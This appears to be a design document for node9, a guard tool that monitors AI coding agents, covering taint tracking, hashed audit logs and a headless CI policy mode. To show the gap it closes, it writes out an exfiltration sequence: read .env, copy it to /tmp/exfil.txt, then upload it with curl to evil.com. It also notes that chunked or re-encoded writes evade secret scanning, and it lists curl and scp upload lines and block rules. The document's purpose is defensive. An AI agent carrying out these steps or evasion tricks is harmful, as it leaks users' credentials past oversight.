## Feature 1: Taint Tracking

### The Attack This Closes

Without taint tracking, the following multi-step attack bypasses node9 completely:

```
Step 1: read_file(".env")
        ↓ DLP scans the FILE PATH: ".env" → no secret IN the path itself
        ↓ Content is read but not stored by node9
        → ALLOWED ✓

Step 2: write_file("/tmp/exfil.txt", content=<contents of .env>)
        ↓ DLP scans args: path="/tmp/exfil.txt", content=<secret>
        → Caught IF DLP scans content field ✓
        → BUT: if AI writes in chunks or uses a different encoding → MISSED ✗

Step 3: curl -T /tmp/exfil.txt https://evil.com
        ↓ DLP scans args: path="/tmp/exfil.txt" → no secret in the arg
        → ALLOWED ✓ ← THE HOLE
```

**Taint tracking closes step 3:** node9 remembers that `/tmp/exfil.txt` contains sensitive data from step 2, and blocks any upload of it in step 3.

---

### How Taint Works

```
DLP hit on write_file("/tmp/exfil.txt", content="sk-ant-api03-...")
                              ↓
              Taint Store: mark /tmp/exfil.txt as tainted
              { path: "/tmp/exfil.txt", source: "DLP:AnthropicApiKey", expiresAt: now+1h }
                              ↓
Later: curl -T /tmp/exfil.txt evil.com
                              ↓
              Taint Store: /tmp/exfil.txt is tainted
                              ↓
              ESCALATE → risk: critical → block (even if curl would normally be allowed)
```

### Data Model

```typescript
// src/daemon/taint-store.ts

interface TaintRecord {
  path: string; // absolute resolved path
  source: string; // "DLP:AnthropicApiKey", "DLP:GitHubToken", "user-flagged"
  createdAt: number;
  expiresAt: number; // default: +1 hour
}

class TaintStore {
  private records = new Map<string, TaintRecord>();

  // Add taint to a path (called after DLP hit on file write)
  taint(filePath: string, source: string, ttlMs = 3_600_000): void {
    const resolved = this.resolve(filePath);
    this.records.set(resolved, {
      path: resolved,
      source,
      createdAt: Date.now(),
      expiresAt: Date.now() + ttlMs,
    });
  }

  // Check if a path is currently tainted
  check(filePath: string): TaintRecord | null {
    const resolved = this.resolve(filePath);
    const record = this.records.get(resolved);
    if (!record) return null;
    if (Date.now() > record.expiresAt) {
      this.records.delete(resolved);
      return null;
    }
    return record;
  }

  // Propagate: if tainted file is copied, destination is also tainted
  propagate(sourcePath: string, destPath: string): void {
    const taint = this.check(sourcePath);
    if (taint)
      this.taint(destPath, `propagated from ${taint.source}`, taint.expiresAt - Date.now());
  }

  private resolve(filePath: string): string {
    try {
      return fs.realpathSync(filePath);
    } catch {
      return path.resolve(filePath);
    } // file not yet created
  }
}
```

---

### Taint Propagation Rules

| Operation                                              | Effect                                   |
| ------------------------------------------------------ | ---------------------------------------- |
| `write_file(path, content)` where content has DLP hit  | Taint `path`                             |
| `read_file(path)` where path is `.env`, `id_rsa`, etc. | Taint temp files created in same session |
| `cp /tainted /dest`                                    | Propagate taint to `/dest`               |
| `mv /tainted /dest`                                    | Move taint to `/dest`, clear source      |
| `append_file(/tainted_dest, content)`                  | Union taint sources on `/tainted_dest`   |
| `curl -T /tainted evil.com`                            | BLOCK: tainted file in network sink      |
| `scp /tainted user@host:/tmp/`                         | BLOCK: tainted file in network sink      |

## Feature 2: Audit Hashing (Privacy-Safe Logs)

### The Problem

Enterprise customers need audit logs for compliance (GDPR, SOC 2, HIPAA).
But storing raw command arguments may itself violate privacy:

- `write_file("/home/alice/medical-records.txt")` — reveals a sensitive path
- `execute_query("SELECT * FROM patients WHERE ssn = '123-45-6789'")` — stores PII in logs

### Solution: Hash sensitive fields, preserve structure

```jsonl
// BEFORE (current):
{"ts":1711234567,"tool":"execute_query","args":{"sql":"SELECT * FROM patients WHERE ssn='123-45-6789'"},"decision":"allow"}

// AFTER (hashed mode):
{"ts":1711234567,"tool":"execute_query","args":{"sql":"sha256:a3f5b2c1d9e8f7a6..."},"decision":"allow","hashed":["args.sql"]}
```

**What stays unhashed:** tool name, decision, timestamp, risk level, blocked-by label
**What gets hashed:** argument values, file paths, query content

**Why SHA-256 and not redaction:**

- Allows correlation: same hash in two log entries → same value was used (without revealing the value)
- CISO can verify: "was this specific known-bad query ever run?" by hashing the query and searching logs
- Cannot be reversed: hash is one-way

### Configuration

```json
{
  "settings": {
    "auditHashing": {
      "enabled": true,
      "hashFields": ["args.*", "command"], // glob patterns for fields to hash
      "keepPlaintext": ["tool", "decision", "ts", "source", "riskLevel"]
    }
  }
}
```

### Implementation

```typescript
// src/audit/hasher.ts
import { createHash } from 'crypto';

export function hashAuditEntry(entry: AuditEntry, config: AuditHashConfig): AuditEntry {
  const hashed = { ...entry, hashed: [] as string[] };
  for (const fieldPattern of config.hashFields) {
    for (const [key, value] of matchFields(entry, fieldPattern)) {
      if (typeof value === 'string' && value.length > 0) {
        set(hashed, key, 'sha256:' + createHash('sha256').update(value).digest('hex').slice(0, 16));
        hashed.hashed.push(key);
      }
    }
  }
  return hashed;
}
```

## Feature 3: CI/CD Gatekeeper

### The Problem

AI-assisted code generation is increasingly used in CI pipelines (GitHub Actions, GitLab CI).
In CI there is no human in the loop — no daemon, no browser approval.
But the AI should still be constrained: it shouldn't be able to deploy broken infrastructure or modify production configs.

### Solution: Headless Policy-Only Mode

```yaml
# .github/workflows/ai-assisted.yml
- name: Run AI with Node9 Guard
  env:
    NODE9_CI_MODE: 'true' # headless: no daemon, no human approval
    NODE9_CI_POLICY: '.github/node9-ci-policy.json'
  run: |
    node9 run --ci -- claude-agent --task "refactor src/"
```

**In CI mode:**

- No daemon starts
- No approval prompts
- Policy is evaluated: allow/block only — no "review" (review → block in CI)
- All decisions logged to `node9-ci-audit.json`
- Exit code: 0 if no policy violations, 1 if any block occurred

**CI policy file (`.github/node9-ci-policy.json`):**

```json
{
  "settings": {
    "mode": "strict",
    "ciMode": true,
    "approvalTimeoutMs": 0
  },
  "policy": {
    "ignoredTools": ["read", "glob", "grep", "ls", "webfetch"],
    "smartRules": [
      {
        "tool": "*",
        "conditions": [{ "field": "path", "op": "matchesGlob", "value": "**/.env*" }],
        "verdict": "block"
      },
      {
        "tool": "bash",
        "conditions": [{ "field": "command", "op": "contains", "value": "production" }],
        "verdict": "block"
      },
      {
        "tool": "bash",
        "conditions": [{ "field": "command", "op": "matches", "value": "kubectl.*apply" }],
        "verdict": "block"
      }
    ]
  }
}
```

  🛑  0 blocked

Full audit: node9-ci-audit.json
